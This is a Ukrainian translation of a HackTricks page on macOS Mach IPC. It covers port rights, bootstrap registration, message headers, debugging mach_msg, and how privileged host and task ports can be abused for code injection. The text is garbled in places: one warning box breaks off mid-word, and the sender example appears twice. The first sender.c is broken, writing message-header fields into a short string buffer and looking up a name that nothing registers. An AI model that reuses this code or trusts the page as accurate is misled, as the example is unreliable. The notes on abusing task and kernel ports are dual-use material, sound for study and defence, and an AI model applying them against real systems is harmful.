# macOS IPC - Міжпроцесорна комунікація

{% hint style="success" %}
Вивчайте та практикуйте хакінг AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання AWS Red Team Expert (ARTE) від HackTricks**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте хакінг GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання GCP Red Team Expert (GRTE) від HackTricks**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}

## Повідомлення Mach через порти

### Основна інформація

Mach використовує **задачі** як **найменшу одиницю** для обміну ресурсами, і кожна задача може містити **кілька потоків**. Ці **задачі та потоки відображаються відношенням 1:1 до процесів та потоків POSIX**.

Комунікація між задачами відбувається через міжпроцесорну комунікацію Mach (IPC), використовуючи односторонні канали зв'язку. **Повідомлення передаються між портами**, які діють як **черги повідомлень**, керовані ядром.

**Порт** є **основним** елементом IPC Mach. Його можна використовувати для **відправлення та отримання повідомлень**.

У кожному процесі є **таблиця IPC**, де можна знайти **порти mach процесу**. Назва порту Mach фактично є числом (вказівником на об'єкт ядра).

Процес також може відправити ім'я порту з деякими правами **іншій задачі**, і ядро зробить цей запис у **таблиці IPC іншої задачі**.

### Права порту

Права порту, які визначають операції, які може виконувати задача, є ключовими для цієї комунікації. Можливі **права порту** ([визначення тут](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Право отримання**, яке дозволяє отримувати повідомлення, відправлені на порт. Порти Mach є чергами MPSC (багатопродуктові, одноконсумерні), що означає, що може бути **лише одне право отримання для кожного порту** в усій системі (на відміну від каналів, де кілька процесів можуть утримувати дескриптори файлів для читання з одного каналу).
* **Задача з правом отримання** може отримувати повідомлення та **створювати права відправлення**, що дозволяє відправляти повідомлення. Спочатку лише **власна задача має право отримання над своїм портом**.
* Якщо власник права отримання **помер або вбив його**, право відправлення стає некорисним (мертве ім'я).
* **Право відправлення**, яке дозволяє відправляти повідомлення на порт.
* Право відправлення можна **клонувати**, тому задача, яка володіє правом відправлення, може склонувати право та **надати його третій задачі**.
* Зауважте, що **права порту** також можуть бути **передані** через повідомлення Mac.
* **Право відправлення один раз**, яке дозволяє відправити одне повідомлення на порт, після чого воно зникає.
* Це право **не можна клонувати**, але його можна **перемістити**.
* **Право на набір портів**, яке вказує на _набір портів_ замість одного порту. Вибір повідомлення з набору портів вибирає повідомлення з одного з його портів. Набори портів можуть використовуватися для прослуховування кількох портів одночасно, схоже на `select`/`poll`/`epoll`/`kqueue` в Unix.
* **Мертве ім'я**, яке не є фактичним правом порту, а лише заповнювачем. Коли порт знищується, всі існуючі права порту на порт перетворюються на мертві імена.

**Задачі можуть передавати ПРАВА ВІДПРАВЛЕННЯ іншим**, дозволяючи їм відправляти повідомлення назад. **ПРАВА ВІДПРАВЛЕННЯ також можна клонувати, тому задача може дублювати та давати право третій задачі**. Це, разом із проміжним процесом, відомим як **запусковий сервер**, дозволяє ефективно спілкуватися між задачами.

### Порти файлів

Порти файлів дозволяють інкапсулювати дескриптори файлів у портах Mac (з використанням прав порту Mach). Можливо створити `fileport` з заданим FD за допомогою `fileport_makeport` та створити FD з fileport за допомогою `fileport_makefd`.

### Встановлення зв'язку

Як вже зазначалося, можливо відправляти права за допомогою повідомлень Mach, однак ви **не можете відправити право без наявності права відправлення повідомлення Mach**. Тоді як встановлюється перший зв'язок?

Для цього включений **запусковий сервер** (**launchd** в Mac), оскільки **кожен може отримати ПРАВО ВІДПРАВЛЕННЯ до запускового сервера**, можливо попросити його про право відправити повідомлення іншому процесу:

1. Задача **A** створює **новий порт**, отримуючи **ПРАВО ОТРИМАННЯ** над ним.
2. Задача **A**, яка є власником ПРАВА ОТРИМАННЯ, **генерує ПРАВО ВІДПРАВЛЕННЯ для порту**.
3. Задача **A** встановлює **з'єднання** з **запусковим сервером** та **відправляє йому ПРАВО ВІДПРАВЛЕННЯ для порту**, яке вона згенерувала на початку.
* Пам'ятайте, що кожен може отримати ПРАВО ВІДПРАВЛЕННЯ до запускового сервера.
4. Задача A відправляє повідомлення `bootstrap_register` запусковому серверу, щоб **асоціювати заданий порт з ім'ям**, наприклад, `com.apple.taska`.
5. Задача **B** взаємодіє з **запусковим сервером** для виконання **пошуку запуску для імені служби** (`bootstrap_lookup`). Щоб запусковий сервер міг відповісти, задача B відправить йому **ПРАВО ВІДПРАВЛЕННЯ до порту, яке вона попередньо створила** всередині повідомлення пошуку. Якщо пошук успішний, **сервер скопіює ПРАВО ВІДПРАВЛЕННЯ**, отримане від Задачі A, та **передасть його Задачі B**.
* Пам'ятайте, що кожен може отримати ПРАВО ВІДПРАВЛЕННЯ до запускового сервера.
6. З цим ПРАВОМ ВІДПРАВЛЕННЯ **Задача B** може **відправити повідомлення Задачі A**.
7. Для двонапрямленого зв'язку зазвичай задача **B** генерує новий порт з **ПРАВОМ ОТРИМАННЯ** та **ПРАВОМ ВІДПРАВЛЕННЯ**, і дає **ПРАВО ВІДПРАВЛЕННЯ Задачі A**, щоб вона могла відправляти повідомлення ЗАДАЧІ B (двонапрямлене спілкування).

Запусковий сервер **не може аутентифікувати** ім'я служби, вказане задаче. Це означає, що **задача** може потенційно **підробити будь-яку системну задачу**, наприклад, **фальшиво вказавши ім'я служби авторизації**, а потім схвалюючи кожен запит.

Потім Apple зберігає **імена служб, наданих системою**, у захищених конфігураційних файлах, розташованих у каталогах, захищених SIP: `/System/Library/LaunchDaemons` та `/System/Library/LaunchAgents`. Поряд з кожним ім'ям служби також зберігається **пов'язаний бінарний файл**. Запусковий сервер створить та утримує **ПРАВО ОТРИМАННЯ для кожного з цих імен служб**.

Для цих попередньо визначених служб **процес пошуку відрізняється трохи**. При пошуку імені служби launchd запускає службу динамічно. Новий робочий процес виглядає наступним чином:

* Задача **B** ініціює пошук запуску для імені служби.
* **launchd** перевіряє, чи працює задача, і якщо ні, **запускає** її.
* Задача **A** (служба) виконує **перевірку реєстрації запуску** (`bootstrap_check_in()`). Тут **запусковий** сервер створює ПРАВО ВІДПРАВЛЕННЯ, утримує його та **передає ПРАВО ОТРИМАННЯ Задачі A**.
* launchd копіює **ПРАВО ВІДПРАВЛЕННЯ та відправляє його Задачі B**.
* Задача **B** генерує новий порт з **ПРАВОМ ОТРИМАННЯ** та **ПРАВОМ ВІДПРАВЛЕННЯ**, і дає **ПРАВО ВІДПРАВЛЕННЯ Задачі A** (службі), щоб вона могла відправляти повідомлення ЗАДАЧІ B (двонапрямлене спілкування).

Однак цей процес застосовується лише до попередньо визначених системних задач. Несистемні задачі все ще працюють, як описано раніше, що потенційно може дозволити підробку.

{% hint style="danger" %}
Отже, launchd не повинен ніколи аварійно завершувати роботу, інакше весь система аварійно завершить робот
### Повідомлення Mach

[Знайдіть більше інформації тут](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Функція `mach_msg`, яка в суті є системним викликом, використовується для надсилання та отримання повідомлень Mach. Функція вимагає, щоб повідомлення було надіслано як початковий аргумент. Це повідомлення повинно починатися зі структури `mach_msg_header_t`, за якою йде вміст самого повідомлення. Структура визначається наступним чином:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Процеси, які мають _**право на отримання**_, можуть отримувати повідомлення на порті Mach. Натомість **відправники** мають _**право на відправку**_ або _**право на відправку одного разу**_. Право на відправку одного разу призначене виключно для відправлення одного повідомлення, після чого воно стає недійсним.

Початкове поле **`msgh_bits`** є бітовою маскою:

* Перший біт (найбільш значущий) використовується для позначення того, що повідомлення складне (докладніше див. нижче)
* 3-й та 4-й біти використовуються ядром
* **5 менш значущих бітів 2-го байту** можуть бути використані для **ваучера**: іншого типу порту для відправки комбінацій ключ/значення.
* **5 менш значущих бітів 3-го байту** можуть бути використані для **локального порту**
* **5 менш значущих бітів 4-го байту** можуть бути використані для **віддаленого порту**

Типи, які можуть бути вказані у ваучері, локальних та віддалених портах, визначені у файлі [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Наприклад, `MACH_MSG_TYPE_MAKE_SEND_ONCE` може бути використаний для **вказівки** того, що **право на відправку один раз** повинно бути похідне та передане для цього порту. Також може бути вказано `MACH_PORT_NULL`, щоб запобігти отримувачу мати можливість відповісти.

Для досягнення простої **двосторонньої комунікації** процес може вказати **mach порт** у заголовку mach **повідомлення**, який називається _портом відповіді_ (**`msgh_local_port`**), куди **отримувач** повідомлення може **відправити відповідь** на це повідомлення.

{% hint style="success" %}
Зверніть увагу, що цей вид двосторонньої комунікації використовується в повідомленнях XPC, які очікують відповіді (`xpc_connection_send_message_with_reply` та `xpc_connection_send_message_with_reply_sync`). Проте, **зазвичай створюються різні порти**, як пояснено раніше, для створення двосторонньої комунікації.
{% endhint %}

Інші поля заголовка повідомлення:

* `msgh_size`: розмір всього пакета.
* `msgh_remote_port`: порт, на який відправлено це повідомлення.
* `msgh_voucher_port`: [mach ваучери](https://robert.sesek.com/2023/6/mach\_vouchers.html).
* `msgh_id`: ідентифікатор цього повідомлення, який інтерпретується отримувачем.

{% hint style="danger" %}
Зверніть увагу, що **mach повідомлення відправляються через `mach порт`**, який є **каналом зв'язку один до одного**, **будується в ядрі mach**. **Декілька процесів** можуть **відправляти повідомлення** на mach порт, але в будь-який момент тільки **один процес може читати** з нього.
{% endhint %}

Повідомлення потім формуються заголовком **`mach_msg_header_t`**, за яким слідує **тіло** та **трейлер** (якщо є) і може надавати дозвіл на відповідь на нього. У цих випадках ядро просто повинно передати повідомлення від одного завдання до іншого.

**Трейлер** - це **інформація, додана до повідомлення ядром** (не може бути встановлена користувачем), яку можна запросити при отриманні повідомлення з прапорцями `MACH_RCV_TRAILER_<trailer_opt>` (існує різна інформація, яку можна запросити).

#### Складні повідомлення

Проте, є інші більш **складні** повідомлення, наприклад, ті, які передають додаткові права порту або спільний доступ до пам'яті, де ядро також повинно надіслати ці об'єкти отримувачеві. У цих випадках найбільш значущий біт заголовка `msgh_bits` встановлюється.

Можливі дескриптори для передачі визначені в [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
У 32 бітах всі дескриптори мають розмір 12 байтів, а тип дескриптора знаходиться в 11-му. У 64 бітах розміри відрізняються.

{% hint style="danger" %}
Ядро скопіює дескриптори з одного завдання в інше, але спочатку **створює копію в пам'яті ядра**. Цю техніку, відому як "Feng Shui", використовували в кількох експлойтах для того, щоб змусити **ядро копіювати дані в своїй пам'яті**, змушуючи процес надсилати дескриптори самому собі. Потім процес може отримати повідомлення (ядро їх звільнить).

Також можливо **надіслати права порту вразливому процесу**, і права порту просто з'являться в процесі (навіть якщо він не обробляє їх).
{% endhint %}

### API портів Mac

Зверніть увагу, що порти пов'язані з простором імен завдання, тому для створення або пошуку порту також запитується простір імен завдання (докладніше в `mach/mach_port.h`):

* **`mach_port_allocate` | `mach_port_construct`**: **Створити** порт.
* `mach_port_allocate` також може створити **набір портів**: право на отримання над групою портів. Кожного разу, коли отримується повідомлення, вказується порт, звідки воно було отримано.
* `mach_port_allocate_name`: Змінити ім'я порту (за замовчуванням це 32-бітне ціле число)
* `mach_port_names`: Отримати імена портів з цільового об'єкта
* `mach_port_type`: Отримати права завдання на ім'я
* `mach_port_rename`: Перейменувати порт (як dup2 для FDs)
* `mach_port_allocate`: Виділити новий ОТРИМАТИ, ПОРТ\_НАБІР або DEAD\_NAME
* `mach_port_insert_right`: Створити нове право в порту, де у вас є ОТРИМАТИ
* `mach_port_...`
* **`mach_msg`** | **`mach_msg_overwrite`**: Функції, що використовуються для **надсилання та отримання mach-повідомлень**. Версія з перезаписом дозволяє вказати інший буфер для отримання повідомлення (інша версія просто повторно використовує його).

### Налагодження mach\_msg

Оскільки функції **`mach_msg`** та **`mach_msg_overwrite`** використовуються для надсилання та отримання повідомлень, встановлення точки зупинки на них дозволить перевірити надіслані та отримані повідомлення.

Наприклад, почніть налагодження будь-якої програми, яку можна налагоджувати, оскільки вона завантажить **`libSystem.B`, яка використовуватиме цю функцію**.
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Отримайте значення з реєстрів:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Перевірте заголовок повідомлення, перевіривши перший аргумент:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Такий тип `mach_msg_bits_t` дуже поширений для дозволу відповіді.



### Перелік портів
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**Ім'я** - це типове ім'я, яке надається порту (перевірте, як воно **збільшується** у перших 3 байтах). **`ipc-object`** - це **затемнений** унікальний **ідентифікатор** порту.\
Також зверніть увагу на те, як порти лише з правом **`send`** ідентифікують **власника** (ім'я порту + pid).\
Також зверніть увагу на використання **`+`** для позначення **інших завдань, підключених до того ж порту**.

Також можна використовувати [**procesxp**](https://www.newosxbook.com/tools/procexp.html), щоб побачити також **зареєстровані назви служб** (з вимкненим SIP через необхідність `com.apple.system-task-port`).
```
procesp 1 ports
```
Ви можете встановити цей інструмент в iOS, завантаживши його з [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Приклад коду

Зверніть увагу, як **відправник** виділяє порт, створює **право на відправку** для імені `org.darlinghq.example` та надсилає його на **сервер завантаження**, тоді як відправник запросив **право на відправку** цього імені та використовував його для **надсилання повідомлення**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %} 
### Відправник

Цей приклад демонструє відправлення повідомлення через міжпроцесовий канал (IPC) на macOS. Він створює чергу повідомлень, відправляє повідомлення та очікує відповідь від отримувача.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <mach/mach.h>

#define QUEUE_NAME "com.example.queue"

int main() {
    mach_port_t port;
    kern_return_t err;

    err = task_get_special_port(mach_task_self(), TASK_NAME_PORT, &port);
    if (err != KERN_SUCCESS) {
        fprintf(stderr, "Failed to get task special port: %s\n", mach_error_string(err));
        exit(1);
    }

    mach_port_t queue;
    err = bootstrap_look_up(bootstrap_port, QUEUE_NAME, &queue);
    if (err != KERN_SUCCESS) {
        fprintf(stderr, "Failed to look up queue port: %s\n", mach_error_string(err));
        exit(1);
    }

    char message[] = "Hello, receiver!";
    mach_msg_header_t *msg = (mach_msg_header_t *)message;
    msg->msgh_local_port = port;
    msg->msgh_remote_port = queue;
    msg->msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE, 0, 0);
    msg->msgh_id = 0;
    msg->msgh_size = sizeof(message);

    err = mach_msg(msg, MACH_SEND_MSG, msg->msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (err != KERN_SUCCESS) {
        fprintf(stderr, "Failed to send message: %s\n", mach_error_string(err));
        exit(1);
    }

    printf("Message sent successfully!\n");

    return 0;
}
```

{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

## Привілейовані порти

Існують деякі спеціальні порти, які дозволяють **виконувати певні чутливі дії або отримувати доступ до певних чутливих даних**, якщо завдання мають дозволи **SEND** на них. Це робить ці порти дуже цікавими з точки зору атаки не лише через можливості, але й через можливість **поділу дозволів SEND між завданнями**.

### Спеціальні порти хоста

Ці порти представлені числами.

Права **SEND** можна отримати, викликавши **`host_get_special_port`**, а права **RECEIVE** - викликавши **`host_set_special_port`**. Однак обидва виклики потребують порту **`host_priv`**, до якого може отримати доступ лише root. Більше того, у минулому root міг викликати **`host_set_special_port`** та захоплювати довільний, що дозволяло, наприклад, обхід підписів коду, захоплюючи `HOST_KEXTD_PORT` (SIP зараз запобігає цьому).

Ці порти поділені на 2 групи: **перші 7 портів належать ядру**, де 1 - `HOST_PORT`, 2 - `HOST_PRIV_PORT`, 3 - `HOST_IO_MASTER_PORT`, а 7 - `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Ті, що починають **з номера 8**, **належать системним службам** і можуть бути знайдені в оголошенні [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html).

* **Порт хоста**: Якщо процес має **привілей SEND** на цей порт, він може отримати **інформацію** про **систему**, викликаючи його рутина, наприклад:
* `host_processor_info`: Отримати інформацію про процесор
* `host_info`: Отримати інформацію про хост
* `host_virtual_physical_table_info`: Віртуальна/фізична таблиця сторінок (потрібен MACH\_VMDEBUG)
* `host_statistics`: Отримати статистику хоста
* `mach_memory_info`: Отримати розташування пам'яті ядра
* **Привілейований порт хоста**: Процес з правом **SEND** на цей порт може виконувати **привілейовані дії**, наприклад, показувати дані завантаження або спробу завантажити розширення ядра. **Процес повинен бути root**, щоб отримати цей дозвіл.
* Більше того, для виклику API **`kext_request`** потрібно мати інші дозволи **`com.apple.private.kext*`**, які надаються лише бінарним файлам Apple.
* Інші рутина, які можна викликати:
* `host_get_boot_info`: Отримати `machine_boot_info()`
* `host_priv_statistics`: Отримати привілейовану статистику
* `vm_allocate_cpm`: Виділити послідовну фізичну пам'ять
* `host_processors`: Послати право на процесори хоста
* `mach_vm_wire`: Зробити пам'ять постійною
* Оскільки **root** може отримати доступ до цього дозволу, він може викликати `host_set_[special/exception]_port[s]`, щоб **захопити спеціальні або виняткові порти хоста**.

Можливо **переглянути всі спеціальні порти хоста**, запустивши:
```bash
procexp all ports | grep "HSP"
```
### Спеціальні порти завдань

Це порти, зарезервовані для відомих служб. Їх можна отримати/встановити, викликавши `task_[get/set]_special_port`. Їх можна знайти в `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
З [тут](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html):

* **TASK\_KERNEL\_PORT**\[право на відправку task-self\]: Порт, який використовується для управління цим завданням. Використовується для відправлення повідомлень, які впливають на завдання. Це порт, який повертає **mach\_task\_self (див. порти завдань нижче)**.
* **TASK\_BOOTSTRAP\_PORT**\[право на відправку bootstrap\]: Запусковий порт завдання. Використовується для відправлення повідомлень із запитом на повернення інших портів служб системи.
* **TASK\_HOST\_NAME\_PORT**\[право на відправку host-self\]: Порт, який використовується для запиту інформації про вміст хоста. Це порт, який повертає **mach\_host\_self**.
* **TASK\_WIRED\_LEDGER\_PORT**\[право на відправку ledger\]: Порт, який називає джерело, з якого це завдання витягує свою керовану ядром пам'ять.
* **TASK\_PAGED\_LEDGER\_PORT**\[право на відправку ledger\]: Порт, який називає джерело, з якого це завдання витягує свою пам'ять, керовану за замовчуванням.

### Порти завдань

Спочатку у Mach не було "процесів", були "завдання", які вважалися більш як контейнери для потоків. Коли Mach був об'єднаний з BSD, **кожне завдання було корелювано з процесом BSD**. Тому кожен процес BSD має необхідні деталі для того, щоб бути процесом, і кожне завдання Mach також має свою внутрішню структуру (крім неіснуючого pid 0, який є `kernel_task`).

Є дві дуже цікаві функції, пов'язані з цим:

* `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Отримати право на відправку для порту завдання завдання, пов'язаного із вказаним `pid`, і передати його вказаному `target_task_port` (який зазвичай є викликаючим завданням, яке використовувало `mach_task_self()`, але може бути портом відправки через інше завдання).
* `pid_for_task(task, &pid)`: Заданий право на відправку до завдання, знайти, до якого PID це завдання відноситься.

Для виконання дій у межах завдання, завданню потрібно право на відправку до себе, викликаючи `mach_task_self()` (яке використовує `task_self_trap` (28)). З цим дозволом завдання може виконати кілька дій, таких як:

* `task_threads`: Отримати право на відправку над усіма портами завдань потоків завдання
* `task_info`: Отримати інформацію про завдання
* `task_suspend/resume`: Призупинити або відновити завдання
* `task_[get/set]_special_port`
* `thread_create`: Створити потік
* `task_[get/set]_state`: Керувати станом завдання
* і більше можна знайти в [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

{% hint style="danger" %}
Зверніть увагу, що з правом на відправку порту завдання **іншого завдання** можливо виконати такі дії над іншим завданням.
{% endhint %}

Крім того, порт завдання також є **портом `vm_map`**, який дозволяє **читати та змінювати пам'ять** всередині завдання за допомогою функцій, таких як `vm_read()` та `vm_write()`. Це в основному означає, що завдання з правами на відправку порту завдання іншого завдання зможе **впровадити код у це завдання**.

Пам'ятайте, що оскільки **ядро також є завданням**, якщо хтось зможе отримати **права на відправку** над **`kernel_task`**, він зможе змусити ядро виконати будь-що (втечі з в'язниці).

* Викликайте `mach_task_self()` для **отримання імені** для цього порту для викликаючого завдання. Цей порт **спадковується** лише під час **`exec()`**; нове завдання, створене за допомогою `fork()`, отримує новий порт завдання (як особливий випадок, завдання також отримує новий порт завдання після `exec()` у suid-бінарних файлах). Єдиний спосіб створити завдання та отримати його порт - виконати ["танець обміну портами"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) під час виконання `fork()`.
* Це обмеження доступу до порту (з `macos_task_policy` з бінарного файлу `AppleMobileFileIntegrity`):
* Якщо додаток має **дозвіл com.apple.security.get-task-allow**, процеси від **того ж користувача можуть отримати доступ до порту завдання** (зазвичай додано Xcode для налагодження). Процес нотаризації не дозволить це для виробничих версій.
* Додатки з дозволом **`com.apple.system-task-ports`** можуть отримати **порт завдання для будь-якого** процесу, крім ядра. У старих версіях це називалося **`task_for_pid-allow`**. Це надається лише додаткам Apple.
* **Root може отримати доступ до портів завдань** додатків, **не** скомпільованих з **захищеним** режимом виконання (і не від Apple).

